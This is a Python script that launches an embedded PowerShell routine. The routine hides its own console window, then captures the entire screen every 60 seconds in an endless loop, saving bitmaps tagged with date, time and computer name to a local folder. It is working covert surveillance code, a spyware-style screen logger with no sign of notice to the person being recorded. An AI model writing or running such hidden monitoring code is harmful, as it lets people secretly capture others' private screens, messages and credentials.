import time
import subprocess

subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
        """

    
#-----------------------------------------------------------------------------------------------
#-----------------------------------HIDES THE CONSOLE-------------------------------------------
#-----------------------------------------------------------------------------------------------
Add-Type -Name win -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);' -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle,0)
#-----------------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------------
#--------------------------------THE MAIN CODE BEGINS-------------------------------------------
#-----------------------------------------------------------------------------------------------

while(1)
{
#following code is used to generate a proper date and time for the log file to be saved.
$hour = get-date -Format "hh"
$minute = get-date -Format "mm"
$day = get-date -Format "dd" 
$month = get-date -Format "MM"
$year = get-date -format "yy"
$folder_name = ((Get-Date).ToString('yyyy-MM-dd'))
$date = "$day" + "-" + "$month" + "-" + "$year" + "___" + "$hour" + "-"+ "$minute" + "__"+"$env:COMPUTERNAME"+".bmp"

#the main code


# Path
$File = "C:\SS\$date"

# Add types and variables
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

# Gather Screen resolution information
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Set bounds
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height

# Create Object
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)

# Capture
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

# Save
$bitmap.Save($File)


Start-Sleep -s 60 #Wait in seconds so that loop may return after particular amount of time


}

        """
                            ])

